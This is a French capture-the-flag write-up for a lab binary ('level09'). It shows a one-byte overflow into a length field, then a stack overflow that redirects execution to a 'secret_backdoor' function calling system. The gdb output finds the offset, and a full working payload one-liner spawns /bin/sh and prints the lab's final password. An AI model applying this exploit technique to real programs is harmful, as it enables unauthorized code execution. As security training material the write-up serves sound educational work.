# level 09 /bonus

On trouve à la racine un binaire level09. Il récupère un username et un message.

En analysant le binaire, on se rend compte de la présence d'une structure :

```c
struct 	s_struct
{
    char message[128];
    char username[40];
    unsigned int i;
};
```
On remarque aussi la présence d'une fonction appelée **secret_backdoor**:

```gdb
(gdb) > i functions
All defined functions:

Non-debugging symbols:
...
0x000055555555488c  secret_backdoor
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
0x00005555555549cd  set_username
0x0000555555554aa8  main
```

> La fonction **secret_backdoor** va prendre un input dans stdin puis exécuter une fonction **system**.

De plus, on peut voir un **strncpy** dans **set_username** d'une taille de 41 de **username** vers notre structure alors que celle ci est de 40.

De plus, on peut voir un **fget** d'une taille de 1024 dans une variable qui ne fait que 128.

Pour finir, dans cette même fonction, on peut voir un **strncpy** :

```c
    strncpy(s->message, message, s->i);
```

Avec tout ces éléments, on suppose qu'on peut donc écrire un octet sur **i** grâce au 41ème caractère qui overflow depuis **username** (grâce à leur placement dans la structure) afin de faire un buffer overflow dans la variable **message** dans cette même structure pour écraser l'**eip** avec l'adresse de **secret_backdoor**.

Il ne nous manque plus qu'a trouver l'**offset** et nous pourront génerer un ret2secret_backdoor.

On a donc posé un breakpoint au **strncpy** pour récupérer l'adresse du début du buffer et un breakpoint avant le return de la fonction **handle_msg** afin de récuperer l'adresse de l'eip.

On les soustrait pour obtenir l'offset.

```gdb
(gdb) > b *set_msg +153
Breakpoint 1 at 0x5555555549cb
(gdb) > b *handle_msg +100
Breakpoint 2 at 0x555555554924
(gdb) > run <<< $(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 100")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 <<< $(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 100")
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude

Breakpoint 1, 0x00005555555549cb in set_msg ()
(gdb) > x/100x $rbp
0x7fffffffe4f0: 0xffffe5c0      0x00007fff      0x55554924      0x00005555
0x7fffffffe500: 0x41414141      0x41414141      0x41414141      0x0a414141
0x7fffffffe510: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe520: 0x00000000      0x00000000      0x00000000      0x00000000
...

(gdb) c
Continuing.

Breakpoint 2, 0x0000555555554924 in handle_msg ()
(gdb) > i f
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x555555554924 in handle_msg; saved rip 0x0
 called by frame at 0x7fffffffe5d8
 Arglist at 0x7fffffffe5c0, args:
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
(gdb) > p 0x7fffffffe5c8 - 0x7fffffffe500 
$1 = 200
```

> On a donc un offset de 200.

Il suffit de rajouter l'adresse de la fonction **secret_backdoor**, un '\n' pour simuler l'entrée d'input, et enfin '/bin/sh' qui sera executé par **system**.

```shell
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' "; cat) | ./level09
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```